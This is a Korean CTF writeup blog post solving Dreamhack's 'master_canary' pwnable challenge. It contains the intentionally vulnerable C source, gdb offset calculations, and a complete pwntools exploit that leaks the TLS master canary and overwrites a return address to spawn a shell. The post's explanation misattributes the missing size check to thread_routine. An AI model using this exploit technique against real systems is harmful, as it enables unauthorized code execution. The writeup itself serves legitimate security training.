---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN master_canary"
excerpt: "드림핵 포너블 master_canary 문제풀이"
tags: [Dreamhack, pwnable, wargame, writeup]
math: true
date: 2023-03-12 18:00
---

이번 문제는 드림핵 master_canary 문제다. 문제 제목 그대로 master canary를 릭해서 푸는 문제이다.

문제 환경으 ubuntu16:04 버전을 사용한다. 우선 해당 문제의 소스코드를 살펴보자.

```c
// gcc -o master master.c -pthread
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>

char *global_buffer;

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}

void *thread_routine() {
    char buf[256];

    global_buffer = buf;

}
void read_bytes(char *buf, size_t size) {
    size_t sz = 0;
    size_t idx = 0;
    size_t tmp;

    while (sz < size) {
        tmp = read(0, &buf[idx], 1);
        if (tmp != 1) {
            exit(-1);
        }
        idx += 1;
        sz += 1;
    }
    return;
}
int main(int argc, char *argv[]) {
    size_t size;
    pthread_t thread_t;
    size_t idx;
    char leave_comment[32];


    initialize();

    while(1) {
        printf("1. Create thread\n");
        printf("2. Input\n");
        printf("3. Exit\n");
        printf("> ");
        scanf("%d", &idx);

        switch(idx) {
            case 1:
                if (pthread_create(&thread_t, NULL, thread_routine, NULL) < 0)
                {
                    perror("thread create error");
                    exit(0);
                }
                break;
            case 2:
                printf("Size: ");
                scanf("%d", &size);

                printf("Data: ");
                read_bytes(global_buffer, size);

                printf("Data: %s", global_buffer);
                break;
            case 3:
                printf("Leave comment: ");
                read(0, leave_comment, 1024);
                return 0;
            default:
                printf("Nope\n");
                break;
        }
    }
    

    return 0;
}
```

위 코드에서 유심히 봐야 할 부분은 case 1: 부분의 pthread_create 함수이다. thread_routine 함수에서는 size에 대한 검증이 없어 버퍼 오버플로우가 발생한다. 또한 스레드 함수인 thread_routine은 TLS와 인접하게 생성되므로 오버플로우를 통해서 TLS에 있는 마스터 카나리 값을 릭 할수 있는 취약점이 존재한다.


공격 시나리오를 생각해보자

우선 1번 메뉴를 통해 스레드를 생성한다. 여기서 thread_routine 함수의 size 미 검증으로 인한 버퍼 오버플로우 취약점이 발생한다. 함수 내부에서 사용되는 buf변후는 전역 변수인 global_buffer 포인터에 대입된다.

이후 2번 메뉴를 통해서 원하는 크기만큼 global_buffer에 값을 쓴다. 여기서 global_buffer는 스레드 함수에서 사용되어 TLS와 인접하게 생성된다. 따라서 buf에서 master canary까지의 거리를 구해 카나리 값 직전까지 덮으면 master canary의 값을 leak 할수 있다.

그 다음 3번 메뉴를 통해서 스텍 오버플로우를 일으킨다. 이때 2번 메뉴를 통해 leak한 canary를 사용해 리턴 주소를 get_shell() 로 바꾼다.


이 정도면 공격에 성공할 것 같다. 디버깅 하면서 하나씩 살펴보자.

gdb를 통해 확인 해 보면 thread_retine에서의 buf 값은 다음과 같다.
```
0x400a75 <thread_routine+26>    lea    rax, [rbp - 0x110] 
<RAX  0x7ffff77eee40>
```
이후 마스터 카나리의 위치를 계산하고 둘의 차를 구한다.
```
pwndbg> x/x $fs_base+0x28
0x7ffff77ef728: 0x4ba9d200
pwndbg> x/x 0x7ffff77ef728-0x7ffff77eee40
0x8e8:  Cannot access memory at address 0x8e8
```
둘의 차는 0x8e8이다. 다만 카나리 값이 하위 1바이트는 00이기 때문에 이 또한 오버라이트 해야지 printf가 00을 만나지 않고 카나리 값을 전부 leak 할 수 있다.

따라서 2번 메뉴를 통해 0x8e8+1 만큼의 size를 주고 A를 0x8e8+1개 입력해 릭 한다.

이후 main 함수에서 다음과 같은 부분을 살펴보자.
```
0x400c39 <main+308>:   lea    rax,[rbp-0x30]
```
이 부분은 3번 메뉴를 통해 값을 입력 받는 leave_comment 변수의 크기이다 0x30의 크기를 가지고 있으나 1024만큼 입력이 가능해 오버플로우가 발생한다.

따라서 A*40 + canary + B*8 + get_shell() 을 페이로드로 입력하면 공격에 성공한다.



```python
from pwn import *
context.update(arch='amd64', os='linux')
#context.log_level = 'debug'

p = remote("host3.dreamhack.games", 10039);
#p = process("./iofile_vtable_check", env={'LD_PRELOAD':'./libc.so.6'})
#p = process("./master_canary")
elf = ELF("./master_canary")
#libc = ELF("./libc.so.6")

master_to_buf = 0x8e9
get_shell = 0x400a4a

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"2")

p.sendlineafter(b"Size: ", str(master_to_buf))
p.sendlineafter(b"Data: ", b"A"*master_to_buf)

p.recvuntil(b"A"*master_to_buf)
canary = u64(b"\x00"+p.recvn(7))
print(f"canary : {hex(canary)}")

p.sendlineafter(b"> ", b"3")

payload = b"A"*40
payload += p64(canary)
payload += b"B"*8
payload += p64(get_shell)

p.sendlineafter('Leave comment: ', payload)

p.interactive()
```
